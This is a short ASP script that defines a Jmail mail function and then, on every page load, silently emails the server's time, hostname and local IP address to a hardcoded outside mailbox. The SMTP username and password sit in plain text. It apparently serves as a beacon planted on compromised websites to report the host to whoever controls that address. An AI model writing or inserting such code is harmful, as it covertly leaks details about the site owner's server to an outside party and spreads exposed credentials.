<%
function JmailSend(Subject,Body,isHtml,HtmlBody,MailTo,From,FromName,Smtp,Username,Password) 
	dim JmailMsg 
	set JmailMsg=server.createobject("jmail.message") 
	JmailMsg.mailserverusername=Username 
	JmailMsg.mailserverpassword=Password 

	JmailMsg.addrecipient MailTo 
	JmailMsg.from=From 
	JmailMsg.fromname=FromName 

	JmailMsg.charset="gb2312" 
	JmailMsg.logging=true 
	JmailMsg.silent=true 

	JmailMsg.subject=Subject 
	JmailMsg.body=Body 
	if isHtml=true then JmailMsg.htmlbody=HtmlBody 

	if not JmailMsg.send(Smtp) then 
	JmailSend="N" 
	else 
	JmailSend="Y" 
	end if 
	JmailMsg.close 
	set JmailMsg=nothing 
end function 

Dim s,str,HtmlBody 
s=Now() & " | " & Request.ServerVariables("SERVER_NAME") &" | " & Request.ServerVariables("LOCAL_ADDR")
HtmlBody=s 
str=JmailSend( "adminwebsite",s,true,HtmlBody,"smtp2007@tom.com","smtp2007@tom.com","webadmin","smtp.tom.com","smtp2007","smtp2008") 

%>